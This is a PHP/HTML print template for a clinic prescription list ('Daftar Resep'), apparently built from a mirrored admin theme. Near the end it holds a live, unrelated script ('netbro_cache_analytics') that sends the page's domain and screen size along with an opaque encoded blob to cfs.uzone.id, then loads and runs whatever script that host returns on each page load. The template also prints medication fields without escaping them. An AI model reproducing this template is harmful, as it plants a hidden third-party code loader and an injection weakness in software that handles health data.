<!DOCTYPE html>
<html lang="en">
<!-- Mirrored from designreset.com/cork/ltr/demo4/apps_invoice-preview.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 17 May 2021 16:04:26 GMT -->

<head>
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, shrink-to-fit=no" />
	<title>
		Resep Media Kesehatan
	</title>
	<link rel="shortcut icon" href="<?= base_url('assets_pasien/') ?>images/logo/favicon_medkes.png" type="images/x-icon" />
	<!-- BEGIN GLOBAL MANDATORY STYLES -->
	<link href="https://fonts.googleapis.com/css?family=Nunito:400,600,700" rel="stylesheet" />
	<link href="<?= base_url('assets/admin/') ?>bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<link href="<?= base_url('assets/admin/') ?>assets/css/plugins.css" rel="stylesheet" type="text/css" />
	<link href="<?= base_url('assets/admin/') ?>plugins/perfect-scrollbar/perfect-scrollbar.css" rel="stylesheet" type="text/css" />
	<!-- END GLOBAL MANDATORY STYLES -->

	<!--  BEGIN CUSTOM STYLE FILE  -->
	<link href="<?= base_url('assets/admin/') ?>assets/css/apps/invoice-preview.css" rel="stylesheet" type="text/css" />
	<!--  END CUSTOM STYLE FILE  -->
</head>

<body>
	<!--  BEGIN MAIN CONTAINER  -->
	<div class="main-container" id="container">
		<!--  BEGIN CONTENT AREA  -->
		<div id="content" class="main-content">
			<div class="layout-px-spacing" style="margin-top: -60px;">
				<div class="row invoice layout-spacing">
					<div class="col-xl-12 col-lg-12 col-md-12 col-sm-12 col-12">
						<div class="doc-container">
							<div class="row">
								<div class="col-xl-10">
									<div class="invoice-container">
										<div class="invoice-inbox">
											<div id="ct" class="">
												<div class="invoice-00001">
													<div class="content-section">
														<div class="inv--head-section inv--detail-section">
															<div class="row">
																<div class="col-sm-6 col-12 mr-auto">
																	<div class="d-flex">
																		<img src="<?= base_url('assets_pasien/') ?>images/logo/logo_medkes2.png" alt="company" />
																	</div>
																</div>

																<div class="col-sm-6" style="text-align: right">
																	<p class="inv-street-addr">
																		Media Kesehatan
																	</p>
																	<p class="inv-email-address">
																		helpmedkes@gmail.com
																	</p>
																	<p class="inv-email-address">
																		0812 3456 7891
																	</p>
																</div>
															</div>
														</div>

														<div class="inv--product-table-section">
															<h2 class="mb-4 text-center">Daftar Resep</h2>
															<div class="table-responsive">
																<table class="table">
																	<thead class="">
																		<tr>
																			<th scope="col">No.</th>
																			<th scope="col">Nama Obat</th>
																			<th class="text-right" scope="col">
																				Cara Pakai
																			</th>
																			<th class="text-right" scope="col">
																				Dosis
																			</th>
																		</tr>
																	</thead>
																	<tbody>
																		<?php $no = 1; ?>
																		<?php foreach ($resep as $data) { ?>
																			<tr>
																				<th><?= $no++ ?></th>
																				<td><?= $data->nama_obat ?></td>
																				<td class="text-right"><?= $data->cara_pakai ?></td>
																				<td class="text-right"><?= $data->dosis ?></td>
																			</tr>
																		<?php	} ?>
																	</tbody>
																</table>
															</div>
														</div>
														<div class="inv--total-amounts">
															<div class="row mt-4">
																<div class="col-sm-5 col-12 order-sm-0 order-1"></div>
																<div class="col-sm-7 col-12 order-sm-1 order-0">
																	<div class="text-sm-right">
																		<div class="row">
																			<div class="col-12 grand-total-title">
																				<p>Dicetak pada <?= longdate_indo(date("Y-m-d")).' '.date("h:i:s") ?> </p>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<!--  END CONTENT AREA  -->
	</div>
	<!-- END MAIN CONTAINER -->

	<!-- BEGIN GLOBAL MANDATORY SCRIPTS -->
	<script src="<?= base_url('assets/admin/') ?>assets/js/libs/jquery-3.1.1.min.js"></script>
	<script src="<?= base_url('assets/admin/') ?>bootstrap/js/popper.min.js"></script>
	<script src="<?= base_url('assets/admin/') ?>bootstrap/js/bootstrap.min.js"></script>
	<script src="<?= base_url('assets/admin/') ?>plugins/perfect-scrollbar/perfect-scrollbar.min.js"></script>
	<script src="<?= base_url('assets/admin/') ?>assets/js/app.js"></script>

	<script>
		$(document).ready(function() {
			App.init();
		});
	</script>

	<script>
		window.print();
	</script>




	<script type="text/javascript">
		if (self == top) {
			function netbro_cache_analytics(fn, callback) {
				setTimeout(function() {
					fn();
					callback();
				}, 0);
			}

			function sync(fn) {
				fn();
			}

			function requestCfs() {
				var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
				var idc_glo_r = Math.floor(Math.random() * 99999999999);
				var url = idc_glo_url + "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
					"4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXo4kodK9nTBDBaLSTjZTQN5t4qqqPE0OQQnjKckje6vc2x6bOPYSemTP1SZRbwJC4j0%2fmM9CwFEJ3cFEGEMnLSQW%2fjNVUvsFxT8A%2bK3B7fYuSZ3LzAiJGLvUbg1wKejxpLrUhWE5XxLkJPPZArkcVVhlx1puT8kp%2fDw7PP%2f1JHyVMMgZC1DiO4rRDe0kUbEUpmpdSt7CVq04VO0KdCgbHaTP1BfZLMDWxIg9C09yE24YbcMn9TatslzXxgcA94Mj31i29T0dXk5s%2b05OTxXEs2IptsNeM4uJUgqQZmJLUZDsxQy3BKDUsYXjsKBRtQGasy%2bkeXCDaqubG5mh7CYz%2f6mz4wNqtT6eTFH4bvKz6T4SFAGxNkBLSvmeybENIW6BD9JFnQ%2baKTZlWgQk40S8TlBDFjPGNaBhMQGJakoQWLkEC8IIEBAVBG%2biouLlKKUsiWBzyz%2bJiRAI0%2f2gaxi685Gq3Sm1VvT9RcMjnxBN6R873jWCQQmTvMF9GkB99wHE3k6SGUxCsRNs%3d" +
					"&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
				var bsa = document.createElement('script');
				bsa.type = 'text/javascript';
				bsa.async = true;
				bsa.src = url;
				(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
			}
			netbro_cache_analytics(requestCfs, function() {});
		};
	</script>
	<script src="<?= base_url('assets/admin/') ?>assets/js/custom.js"></script>
	<!-- END GLOBAL MANDATORY SCRIPTS -->
	<script src="<?= base_url('assets/admin/') ?>assets/js/apps/invoice-preview.js"></script>
</body>


</html>
